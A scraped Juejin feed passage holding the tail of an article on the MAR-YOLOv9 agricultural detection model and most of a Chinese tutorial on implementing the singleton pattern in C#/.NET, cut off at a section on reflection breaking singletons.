<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a48a27c17972453481aa44f89c88c6f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=75n1iIlJCk4J4eisSxRJSMeYMNo%3D" alt="图片10.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/132c0899fd014c2094ec29895e34946e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=9ar3AUwqo8EMcmtCVnKqIl7Zlww%3D" alt="图片11.png" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>结语</strong></h2>
<p>本研究旨在通过开发基于YOLOv9框架的MAR-YOLOv9模型来解决农业目标检测中的领域适应性问题，并取得了显著的性能提升。该模型创新性地设计了一个16倍下采样的骨干网络，并改进了主检测节点，从而增强了模型在农业场景中的适应性。实验中使用了四个不同的数据集进行全面评估，结果表明，与其他基准模型相比，MAR-YOLOv9在精确率、召回率和平均绝对精度（mAP）等指标上均取得了更高的水平。尤其是在水果被遮挡、背景复杂以及光照变化显著的场景下，MAR-YOLOv9也展现出了强大的鲁棒性。同时，MAR-YOLOv9的参数和模型层数更少，在保持高精度的同时降低了存储和计算成本。这一特性使得MAR-YOLOv9更易于部署在资源有限的边缘设备上，为农业领域的实时目标检测提供了可能。未来的研究可以以此研究为基础，进一步探索如何通过优化网络结构、引入更多上下文信息或利用迁移学习方法来改进和优化目标检测模型。同时，我们还将关注农业应用中更实际的需求，例如提高模型对特定作物的识别能力以及实现多目标同时检测，以满足农业生产中多样化的目标检测需求。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[.NET进阶——设计模式（1）单例设计模式]]></title>    <link>https://juejin.cn/post/7579546893191757839</link>    <guid>https://juejin.cn/post/7579546893191757839</guid>    <pubDate>2025-12-04T08:33:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579546893191757839" data-draft-id="7579808521203171362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=".NET进阶——设计模式（1）单例设计模式"/> <meta itemprop="keywords" content=".NET"/> <meta itemprop="datePublished" content="2025-12-04T08:33:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户448846671060"/> <meta itemprop="url" content="https://juejin.cn/user/1945461219656633"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            .NET进阶——设计模式（1）单例设计模式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1945461219656633/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户448846671060
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:33:09.000Z" title="Thu Dec 04 2025 08:33:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>单例设计模式是<strong>创建型设计模式</strong>的核心之一，核心目标是：<strong>保证一个类在整个应用程序生命周期中，只有一个实例对象，并提供一个全局唯一的访问点</strong>—— 简单说，就是 “一个类只能 new 一次，所有地方用的都是同一个对象”。</p>
<h2 data-id="heading-0">一、什么是单例设计模式？</h2>
<h3 data-id="heading-1">1. 官方定义</h3>
<p>单例模式确保一个类仅有一个实例，并提供一个访问该实例的全局访问点。</p>
<h3 data-id="heading-2">2. 通俗比喻</h3>
<p>单例模式就像：</p>
<ul>
<li>校园二手平台的 “支付中心”：整个平台只能有一个支付中心（多实例会导致支付状态混乱、重复扣款），所有订单的支付请求都必须通过这一个中心处理；</li>
<li>你手机的 “设置” 应用：无论你从桌面点多少次 “设置”，打开的都是同一个设置界面（同一个实例），而非每次新建一个；</li>
<li>对比普通类：<code>new Goods()</code> 每次都会创建新对象，而单例类<code>new</code>一次后，后续调用都返回同一个对象。</li>
</ul>
<h3 data-id="heading-3">3. 单例模式的 3 个核心原则（缺一不可）</h3>





















<table><thead><tr><th>核心原则</th><th>目的</th></tr></thead><tbody><tr><td>私有构造函数</td><td>禁止外部通过<code>new</code>创建实例（<code>private Singleton()</code>），从根源控制实例数量；</td></tr><tr><td>静态私有实例</td><td>存储类的唯一实例（<code>private static Singleton _instance;</code>），保证全局唯一；</td></tr><tr><td>公共静态访问点</td><td>提供全局获取实例的方法（<code>public static Singleton GetInstance()</code>），外部只能通过该方法获取实例；</td></tr></tbody></table>
<h2 data-id="heading-4">二、单例模式的常见实现方式（从基础到最优）</h2>
<p>单例的实现有多种方式，核心差异在于<strong>实例初始化时机</strong>和<strong>线程安全</strong>，下面按 “易理解→高性能→线程安全” 的顺序讲解。</p>
<h3 data-id="heading-5">1. 饿汉式（Eager Singleton）—— 最简单，天生线程安全</h3>
<h4 data-id="heading-6">核心逻辑</h4>
<p><strong>类加载时就创建实例</strong>（“饿汉”：迫不及待初始化），无需考虑线程安全，适合实例占用内存小、启动时必须初始化的场景。</p>
<h4 data-id="heading-7">代码实现（缓存管理器示例）</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 饿汉式单例：缓存管理器（校园二手平台统一缓存商品数据）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CacheManager</span>
{
    <span class="hljs-comment">// 1. 静态私有实例：类加载时直接初始化（唯一实例）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> CacheManager _instance = <span class="hljs-keyword">new</span> CacheManager();

    <span class="hljs-comment">// 2. 私有构造函数：禁止外部new</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">CacheManager</span>()</span>
    {
        <span class="hljs-comment">// 初始化缓存（比如连接Redis）</span>
        Console.WriteLine(<span class="hljs-string">"CacheManager实例已创建（饿汉式）"</span>);
    }

    <span class="hljs-comment">// 3. 公共静态访问点：全局获取实例</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CacheManager <span class="hljs-title">GetInstance</span>()</span>
    {
        <span class="hljs-keyword">return</span> _instance;
    }

    <span class="hljs-comment">// 业务方法：添加缓存</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span></span>)</span>
    {
        Console.WriteLine(<span class="hljs-string">$"添加缓存：<span class="hljs-subst">{key}</span> = <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
    }

    <span class="hljs-comment">// 业务方法：获取缓存</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span> <span class="hljs-title">GetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key</span>)</span>
    {
        Console.WriteLine(<span class="hljs-string">$"获取缓存：<span class="hljs-subst">{key}</span>"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">$"缓存值-<span class="hljs-subst">{key}</span>"</span>;
    }
}
</code></pre>
<h4 data-id="heading-8">调用示例</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 多次调用GetInstance，返回同一个实例</span>
<span class="hljs-keyword">var</span> cache1 = CacheManager.GetInstance();
<span class="hljs-keyword">var</span> cache2 = CacheManager.GetInstance();
Console.WriteLine(cache1 == cache2); <span class="hljs-comment">// 输出：True（同一个对象）</span>

cache1.SetCache(<span class="hljs-string">"hot_goods"</span>, <span class="hljs-string">"二手笔记本、二手手机"</span>);
cache2.GetCache(<span class="hljs-string">"hot_goods"</span>); <span class="hljs-comment">// 输出：获取缓存：hot_goods</span>
</code></pre>
<h4 data-id="heading-9">优缺点</h4>





















<table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>实现简单，一行代码初始化；</td><td>类加载时就创建实例，若实例未被使用则浪费内存；</td></tr><tr><td>天生线程安全（CLR 保证静态字段初始化线程安全）；</td><td>无法延迟初始化（比如启动时不需要缓存，却提前创建）；</td></tr><tr><td>无锁，性能最优；</td><td>不支持参数化初始化（比如动态配置 Redis 连接）；</td></tr></tbody></table>
<h4 data-id="heading-10">适用场景</h4>
<ul>
<li>实例占用内存极小（如日志管理器、配置管理器）；</li>
<li>应用启动时必须初始化的核心组件（如支付中心）。</li>
</ul>
<h3 data-id="heading-11">2. 懒汉式（Lazy Singleton）—— 延迟初始化（基础版，线程不安全）</h3>
<h4 data-id="heading-12">核心逻辑</h4>
<p><strong>第一次调用访问点时才创建实例</strong>（“懒汉”：不到用的时候不初始化），节省内存，但基础版存在线程安全问题。</p>
<h4 data-id="heading-13">代码实现</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 懒汉式单例（基础版：线程不安全）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">LazyCacheManager</span>
{
    <span class="hljs-comment">// 1. 静态私有实例：初始为null，延迟初始化</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> LazyCacheManager _instance = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 2. 私有构造函数</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">LazyCacheManager</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"LazyCacheManager实例已创建（懒汉式）"</span>);
    }

    <span class="hljs-comment">// 3. 公共静态访问点：第一次调用时创建实例</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LazyCacheManager <span class="hljs-title">GetInstance</span>()</span>
    {
        <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>) <span class="hljs-comment">// 线程不安全：多线程同时进入会创建多个实例</span>
        {
            _instance = <span class="hljs-keyword">new</span> LazyCacheManager();
        }
        <span class="hljs-keyword">return</span> _instance;
    }

    <span class="hljs-comment">// 业务方法（同饿汉式）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span></span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"添加缓存：<span class="hljs-subst">{key}</span> = <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-14">线程安全问题演示</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 多线程调用，会创建多个实例（单例失效）</span>
Parallel.For(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, i =&gt;
{
    <span class="hljs-keyword">var</span> cache = LazyCacheManager.GetInstance();
    Console.WriteLine(<span class="hljs-string">$"线程<span class="hljs-subst">{i}</span>：<span class="hljs-subst">{cache.GetHashCode()}</span>"</span>);
});
<span class="hljs-comment">// 输出：多个不同的HashCode（说明创建了多个实例）</span>
</code></pre>
<h4 data-id="heading-15">优缺点</h4>

















<table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>延迟初始化，节省内存；</td><td>多线程环境下会创建多个实例，破坏单例；</td></tr><tr><td>支持参数化初始化（扩展）；</td><td>无锁，单线程性能优，但多线程不可用；</td></tr></tbody></table>
<h4 data-id="heading-16">适用场景</h4>
<p>仅适用于<strong>单线程环境</strong>（如桌面小工具），生产环境（多线程 Web 应用）绝对不能用！</p>
<h3 data-id="heading-17">3. 懒汉式（线程安全版）—— 加锁（Lock）</h3>
<h4 data-id="heading-18">核心逻辑</h4>
<p>在基础懒汉式上添加<code>lock</code>锁，保证多线程下只有一个线程能创建实例，解决线程安全问题。</p>
<h4 data-id="heading-19">代码实现</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 懒汉式单例（线程安全版：加Lock）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ThreadSafeCacheManager</span>
{
    <span class="hljs-comment">// 1. 静态私有实例</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadSafeCacheManager _instance = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 2. 锁对象：必须是静态私有只读（避免外部修改）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">object</span> _lockObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();

    <span class="hljs-comment">// 3. 私有构造函数</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">ThreadSafeCacheManager</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"ThreadSafeCacheManager实例已创建（加锁版）"</span>);
    }

    <span class="hljs-comment">// 4. 公共静态访问点：加锁保证线程安全</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ThreadSafeCacheManager <span class="hljs-title">GetInstance</span>()</span>
    {
        <span class="hljs-keyword">lock</span> (_lockObj) <span class="hljs-comment">// 加锁：同一时间只有一个线程能进入</span>
        {
            <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>)
            {
                _instance = <span class="hljs-keyword">new</span> ThreadSafeCacheManager();
            }
        }
        <span class="hljs-keyword">return</span> _instance;
    }

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span></span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"添加缓存：<span class="hljs-subst">{key}</span> = <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-20">优缺点</h4>

















<table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>线程安全，多线程环境可用；</td><td>每次调用 GetInstance 都要加锁，性能损耗（即使实例已创建）；</td></tr><tr><td>延迟初始化，节省内存；</td><td>锁竞争激烈时（高频调用），性能下降；</td></tr></tbody></table>
<h4 data-id="heading-21">适用场景</h4>
<p>中小并发场景（如校园二手平台的日志管理器），高频调用场景需优化。</p>
<h3 data-id="heading-22">4. 双重检查锁定（Double-Checked Locking）—— 最优懒汉式</h3>
<h4 data-id="heading-23">核心逻辑</h4>
<p>在加锁前先检查实例是否已创建（第一次检查），加锁后再检查一次（第二次检查），既保证线程安全，又避免频繁加锁，是生产环境最常用的单例实现。</p>
<h4 data-id="heading-24">代码实现（.NET 推荐写法）</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 懒汉式单例（最优版：双重检查锁定）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DoubleCheckCacheManager</span>
{
    <span class="hljs-comment">// 1. 静态私有实例：加volatile关键字，禁止指令重排序（关键！）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> DoubleCheckCacheManager _instance = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 2. 锁对象</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">object</span> _lockObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();

    <span class="hljs-comment">// 3. 私有构造函数</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">DoubleCheckCacheManager</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"DoubleCheckCacheManager实例已创建（双重检查）"</span>);
    }

    <span class="hljs-comment">// 4. 公共静态访问点：双重检查+锁</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DoubleCheckCacheManager <span class="hljs-title">GetInstance</span>()</span>
    {
        <span class="hljs-comment">// 第一次检查：实例已创建则直接返回，避免加锁（99%的场景走这里）</span>
        <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>)
        {
            <span class="hljs-keyword">lock</span> (_lockObj) <span class="hljs-comment">// 仅实例未创建时加锁</span>
            {
                <span class="hljs-comment">// 第二次检查：防止多线程同时通过第一次检查后，重复创建实例</span>
                <span class="hljs-keyword">if</span> (_instance == <span class="hljs-literal">null</span>)
                {
                    _instance = <span class="hljs-keyword">new</span> DoubleCheckCacheManager();
                }
            }
        }
        <span class="hljs-keyword">return</span> _instance;
    }

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span></span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"添加缓存：<span class="hljs-subst">{key}</span> = <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-25">关键：volatile 关键字</h4>
<p><code>volatile</code> 禁止 CLR 对字段进行 “指令重排序”——<code>new DoubleCheckCacheManager()</code> 实际分三步：</p>
<ol>
<li>分配内存；</li>
<li>初始化实例；</li>
<li>把<code>_instance</code>指向内存地址。若没有<code>volatile</code>，CLR 可能重排序为 1→3→2，导致其他线程拿到 “未初始化的实例”（空引用异常）。</li>
</ol>
<h4 data-id="heading-26">优缺点</h4>





















<table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>线程安全，多线程环境最优；</td><td>代码稍复杂（需注意 volatile）；</td></tr><tr><td>延迟初始化，节省内存；</td><td>无（生产环境首选）；</td></tr><tr><td>仅实例创建时加锁，高频调用性能无损耗；</td><td/></tr></tbody></table>
<h4 data-id="heading-27">适用场景</h4>
<p>生产环境所有多线程场景（校园二手平台的缓存管理器、支付中心、Redis 连接池），是.NET 中最推荐的单例实现。</p>
<h3 data-id="heading-28">5. 静态内部类（Lazy Initialization Holder Class）—— 极简最优版</h3>
<h4 data-id="heading-29">核心逻辑</h4>
<p>利用.NET “静态内部类只有在被引用时才加载” 的特性，实现延迟初始化，且天生线程安全（CLR 保证静态字段初始化线程安全）。</p>
<h4 data-id="heading-30">代码实现</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 静态内部类单例（极简最优版）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">StaticInnerCacheManager</span>
{
    <span class="hljs-comment">// 1. 私有构造函数</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">StaticInnerCacheManager</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"StaticInnerCacheManager实例已创建（静态内部类）"</span>);
    }

    <span class="hljs-comment">// 2. 静态内部类：仅在GetInstance调用时加载</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">SingletonHolder</span>
    {
        <span class="hljs-comment">// 静态字段：类加载时初始化，CLR保证线程安全</span>
        <span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> StaticInnerCacheManager Instance = <span class="hljs-keyword">new</span> StaticInnerCacheManager();
    }

    <span class="hljs-comment">// 3. 公共静态访问点</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StaticInnerCacheManager <span class="hljs-title">GetInstance</span>()</span>
    {
        <span class="hljs-keyword">return</span> SingletonHolder.Instance;
    }

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCache</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span></span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"添加缓存：<span class="hljs-subst">{key}</span> = <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-31">优缺点</h4>

























<table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>线程安全，CLR 原生保证；</td><td>无法实现参数化初始化；</td></tr><tr><td>延迟初始化，节省内存；</td><td/></tr><tr><td>无锁，性能最优；</td><td/></tr><tr><td>代码极简，无 volatile / 锁等易错点；</td><td/></tr></tbody></table>
<h4 data-id="heading-32">适用场景</h4>
<p>无需参数化初始化的单例（如日志管理器、配置管理器），是 “无参数单例” 的最优解。</p>
<h2 data-id="heading-33">三、为什么要用单例模式？</h2>
<p>单例模式的核心价值是<strong>控制实例数量，保证资源 / 状态统一</strong>，以下场景必须用单例：</p>
<h3 data-id="heading-34">1. 资源独占型组件（避免重复创建浪费资源）</h3>
<ul>
<li><strong>缓存管理器</strong>：整个平台只有一个缓存实例，避免多实例重复缓存数据（如 Redis 连接池，多实例会导致连接数爆炸）；</li>
<li><strong>数据库连接池</strong>：单例管理数据库连接，避免频繁创建 / 销毁连接，提升性能；</li>
<li><strong>文件管理器</strong>：单例管理文件读写，避免多实例同时写文件导致冲突。</li>
</ul>
<h3 data-id="heading-35">2. 状态统一型组件（避免多实例状态不一致）</h3>
<ul>
<li><strong>支付中心</strong>：整个平台只有一个支付实例，保证订单支付状态统一（多实例会导致重复扣款、支付状态混乱）；</li>
<li><strong>用户会话管理器</strong>：单例管理用户登录会话，避免多实例导致会话失效；</li>
<li><strong>计数器</strong>：单例统计平台商品访问量，保证计数准确（多实例会导致计数重复 / 丢失）。</li>
</ul>
<h3 data-id="heading-36">3. 全局工具类（避免多实例占用内存）</h3>
<ul>
<li><strong>日志管理器</strong>：单例统一写日志到文件 / 数据库，避免多实例写日志时的 IO 冲突；</li>
<li><strong>配置管理器</strong>：单例加载<code>appsettings.json</code>配置，避免多实例重复读取配置文件。</li>
</ul>
<h2 data-id="heading-37">四、单例模式的注意事项（避坑指南）</h2>
<p>单例模式虽好用，但有多个易踩的坑，必须注意：</p>
<h3 data-id="heading-38">1. 反射会破坏单例</h3>
<p>反射可以通过<code>ConstructorInfo</code>调用私有构造函数，创建新实例：</p>
